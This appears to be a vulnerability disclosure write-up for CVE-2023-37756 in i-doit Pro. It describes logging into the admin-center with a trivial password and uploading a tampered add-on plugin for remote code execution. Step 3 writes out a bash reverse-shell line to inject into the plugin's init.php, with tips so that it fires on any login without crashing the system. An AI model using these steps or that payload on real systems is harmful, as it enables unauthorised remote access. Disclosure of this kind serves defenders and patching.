# CVE-2023-37756 – Weak Password Requirement in admin-center lead to malicious plugin upload in the i-doit Pro 25 and below


i-doit Pro 25 and below are vulnerable to weak password requirement vulnerability in admin-center + malicious plugin upload lead to RCE vulnerability. These vulnerabilities could allows attacker to easily brute force or password guessed to gain access to admin-center and upload malicious plugin to gain remote code execution.

Description of product: i-doit is a web based Open Source IT documentation and CMDB (Configuration Management Database) developed by synetics GmbH. i-doit Pro is the commercial version of the software and requires a paid license. It comes with additional features, professional support, and regular updates and enhancements. Users need to purchase a license to use i-doit Pro, and the cost varies based on the number of users and features required.


Description of vulnerability: We found that this web application has weak password requirement in admin-center account creation, application owner can even set minimum 1 character password with default username “admin”. It could make attacker to easily brute force or password guessed to gain access to admin-center and upload malicious plugin to gain remote code execution.


Affected Webpage: admin-center login page + plugin install

Affected parameter & Component : admin-center login page + plugin install

Step 1 : as there are no password requirement or no password complexity implemented in account creation for admin-center, we can start from brute force.
Screenshot below shows we can login with username “admin” with password “1”

![Password_1_login_result](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/11bec3eb-2199-4567-be18-a270688a4fc9)

![step2](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/d4a782cd-3c6a-43d6-a344-6c4696ce7fd0)


Step 2 : navigate to Add-on tab and choose upload

![step3](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/51387c7d-3423-4143-99de-74e65d13fcdf)


Step 3 : there are some requirement like package.json must exist and we found that the target has implemented async to check every classes and function . but we can download a proper plugin from their customer portal and edit / add in the init.php, this is the safest way to prevent system crash when trigger the payload.
Note: please put & at the end of the line to prevent system crash after payload triggered and init.php is the best place to inject payload
Example : exec ("/bin/bash -c 'bash -i >& /dev/tcp/IP/Port 0>&1 &'");


![step4](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/31264674-80af-45fc-83a7-94a01dbcad61)


![step5](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/657f07bd-f24d-4bee-b082-5d517ef4e2b2)

![step6](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/e43b4528-a95c-4548-9da2-d5a190ba032d)


Note : remember to zip it back and upload

![step7](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/1d214e01-3dd1-45fa-beb1-3ea258e2087b)

![step8](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/cedb565d-9e7f-4ca4-a5e2-193dfee18c8f)


Note : click Install then activate the elected Add-on


![step9](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/93c1fd86-bd31-42c8-94d9-331db8986562)

Note: your payload will be triggered when someone login , it can be anyone.


![final](https://github.com/leekenghwa/CVE-2023-37756-CWE-521-lead-to-malicious-plugin-upload-in-the-i-doit-Pro-25-and-below/assets/45155253/590591ec-56b7-422d-9b75-3be0fd63adc7)
